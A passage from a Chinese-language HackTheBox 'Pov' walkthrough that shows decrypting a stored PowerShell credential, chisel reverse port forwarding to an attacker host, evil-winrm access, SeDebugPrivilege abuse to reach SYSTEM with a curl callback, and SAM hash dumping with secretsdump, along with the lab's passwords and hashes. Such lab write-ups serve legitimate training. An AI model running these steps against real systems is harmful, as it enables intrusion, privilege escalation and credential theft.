+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$credential</span> = <span class="built_in">Import-Clixml</span> <span class="literal">-Path</span> <span class="string">&quot;c:\users\sfitz\documents\connection.xml&quot;</span></span><br><span class="line"><span class="built_in">echo</span> (<span class="variable">$credential</span>.UserName + <span class="string">&quot;:&quot;</span> + <span class="variable">$credential</span>.GetNetworkCredential().Password)</span><br><span class="line"></span><br><span class="line">alaading:f8gQ8fynP44ek1m3</span><br></pre></td></tr></table></figure>
+
+<p>得到密碼后，轉發對面的5985到本地，由於只開放了80端口，所以要用chisel把winrm(5985)轉發出來，然後用evil-winrm 去連接，如果使用RunasCS.exe去運行的話，會有一些未知的bug出現。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">./chisel_linux_amd64 server -p 3333 --reverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 對面</span></span><br><span class="line">.\c.exe client 10.10.16.3:3333 R:5985:5985</span><br></pre></td></tr></table></figure>
+
+<p>然後用winrm進入到第二個user，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u <span class="string">&#x27;alaading&#x27;</span> -p <span class="string">&#x27;f8gQ8fynP44ek1m3&#x27;</span> -i  127.0.0.1</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\mane&gt; <span class="built_in">whoami</span></span><br><span class="line">pov\alaading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\mane&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x7-濫用-SeDebugPrivilege​-to-Root"><a href="#0x7-濫用-SeDebugPrivilege​-to-Root" class="headerlink" title="0x7 濫用 SeDebugPrivilege​ to Root"></a>0x7 濫用 <code>SeDebugPrivilege</code>​ to Root</h2><p><a target="_blank" rel="noopener" href="https://github.com/decoder-it/psgetsystem/tree/master">https://github.com/decoder-it/psgetsystem/tree/master</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\mane&gt; . .\psgetsys.ps1</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\mane&gt; <span class="built_in">Get-Process</span> winlogon</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="built_in">SI</span> ProcessName</span><br><span class="line"><span class="literal">-------</span>  <span class="literal">------</span>    <span class="literal">-----</span>      <span class="literal">-----</span>     <span class="literal">------</span>     <span class="literal">--</span>  <span class="literal">--</span> <span class="literal">-----------</span></span><br><span class="line">    <span class="number">255</span>      <span class="number">12</span>     <span class="number">2644</span>      <span class="number">16404</span>       <span class="number">0.14</span>    <span class="number">544</span>   <span class="number">1</span> winlogon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\mane&gt; ImpersonateFromParentPid <span class="literal">-ppid</span> <span class="number">544</span> <span class="literal">-command</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-cmdargs</span> <span class="string">&quot;/c powershell.exe curl http://10.10.16.3/test&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然後kali收到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.129.203.253 - - [28/Jan/2024 22:05:20] code 404, message File not found</span><br><span class="line">10.129.203.253 - - [28/Jan/2024 22:05:20] <span class="string">&quot;GET /test HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>
+
+<p>這個時候傳一個shell上去，</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                  Description                                   State</span><br><span class="line">P============================== ============================================= ========</span><br><span class="line">SeAssignPrimaryTokenPrivilege   Replace a <span class="keyword">process</span> level token                 Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege        Adjust memory quotas <span class="keyword">for</span> a <span class="keyword">process</span>            Disabled</span><br><span class="line">SeTcbPrivilege                  Act as part of the operating system           Enabled</span><br><span class="line">SeSecurityPrivilege             Manage auditing and security log              Disabled</span><br><span class="line">SeTakeOwnershipPrivilege        Take ownership of files or other objects      Disabled</span><br><span class="line">SeLoadDriverPrivilege           Load and unload device drivers                Disabled</span><br><span class="line">SeProfileSingleProcessPrivilege Profile single <span class="keyword">process</span>                        Enabled</span><br><span class="line">SeIncreaseBasePriorityPrivilege Increase scheduling priority                  Enabled</span><br><span class="line">SeCreatePermanentPrivilege      Create permanent shared objects               Enabled</span><br><span class="line">SeBackupPrivilege               Back up files and directories                 Disabled</span><br><span class="line">SeRestorePrivilege              Restore files and directories                 Disabled</span><br><span class="line">SeShutdownPrivilege             Shut down the system                          Disabled</span><br><span class="line">SeDebugPrivilege                Debug programs                                Enabled</span><br><span class="line">SeAuditPrivilege                Generate security audits                      Enabled</span><br><span class="line">SeSystemEnvironmentPrivilege    Modify firmware environment values            Disabled</span><br><span class="line">SeChangeNotifyPrivilege         Bypass traverse checking                      Enabled</span><br><span class="line">SeUndockPrivilege               Remove computer from docking station          Disabled</span><br><span class="line">SeManageVolumePrivilege         Perform volume maintenance tasks              Disabled</span><br><span class="line">SeImpersonatePrivilege          Impersonate a client after authentication     Enabled</span><br><span class="line">SeCreateGlobalPrivilege         Create global objects                         Enabled</span><br><span class="line">SeTrustedCredManAccessPrivilege Access Credential Manager as a trusted caller Disabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xA-Hashes"><a href="#0xA-Hashes" class="headerlink" title="0xA Hashes"></a>0xA Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-secretsdump -sam sam.jpg  -system system.jpg LOCAL -<span class="built_in">history</span></span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x5c1cf6f08de4a912953935cbcc67be11</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7c883121d0f63ee5b4312ba7572689b:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1fa5b00b7c6cc4ac2807c4d5b3dd3dab:::</span><br><span class="line">sfitz:1000:aad3b435b51404eeaad3b435b51404ee:012e5ed95e8745ea5180f81648b6ec94:::</span><br><span class="line">alaading:1001:aad3b435b51404eeaad3b435b51404ee:31c0583909b8349cbe92961f9dfa5dbf:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xB-secpolicy-inf"><a href="#0xB-secpolicy-inf" class="headerlink" title="0xB secpolicy.inf"></a>0xB secpolicy.inf</h2><p>可以看見哪些用戶有特殊權，</p>
+<p>參考：<a target="_blank" rel="noopener" href="https://hinchley.net/articles/override-user-rights-set-via-group-policy-using-secedit">https://hinchley.net/articles/override-user-rights-set-via-group-policy-using-secedit</a></p>
+<p>​<code>secedit /export /cfg secpolicy.inf /areas USER_RIGHT</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[Unicode]</span><br><span class="line">Unicode=yes</span><br><span class="line">[Privilege Rights]</span><br><span class="line">SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551</span><br><span class="line">SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551</span><br><span class="line">SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551</span><br><span class="line">SeSystemtimePrivilege = *S-1-5-19,*S-1-5-32-544</span><br><span class="line">SeCreatePagefilePrivilege = *S-1-5-32-544</span><br><span class="line">SeDebugPrivilege = alaading,*S-1-5-32-544</span><br><span class="line">SeRemoteShutdownPrivilege = *S-1-5-32-544</span><br><span class="line">SeAuditPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236</span><br><span class="line">SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236</span><br><span class="line">SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0</span><br><span class="line">SeLoadDriverPrivilege = *S-1-5-32-544</span><br><span class="line">SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559,*S-1-5-32-568</span><br><span class="line">SeServiceLogonRight = *S-1-5-80-0,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236</span><br><span class="line">SeInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551</span><br><span class="line">SeSecurityPrivilege = *S-1-5-32-544</span><br><span class="line">SeSystemEnvironmentPrivilege = *S-1-5-32-544</span><br><span class="line">SeProfileSingleProcessPrivilege = *S-1-5-32-544</span><br><span class="line">SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420</span><br><span class="line">SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236</span><br><span class="line">SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551</span><br><span class="line">SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551</span><br><span class="line">SeTakeOwnershipPrivilege = *S-1-5-32-544</span><br><span class="line">SeUndockPrivilege = *S-1-5-32-544</span><br><span class="line">SeManageVolumePrivilege = *S-1-5-32-544</span><br><span class="line">SeRemoteInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-555</span><br><span class="line">SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6</span><br><span class="line">SeCreateGlobalPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6</span><br><span class="line">SeIncreaseWorkingSetPrivilege = *S-1-5-32-545</span><br><span class="line">SeTimeZonePrivilege = *S-1-5-19,*S-1-5-32-544</span><br><span class="line">SeCreateSymbolicLinkPrivilege = *S-1-5-32-544</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege = *S-1-5-32-544</span><br><span class="line">[Version]</span><br><span class="line">signature=&quot;$CHICAGO$&quot;</span><br><span class="line">Revision=1</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&text=HackTheBox - Machine - Pov"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&is_video=false&description=HackTheBox - Machine - Pov"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Pov&body=Check out this article: https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&name=HackTheBox - Machine - Pov&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&t=HackTheBox - Machine - Pov"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
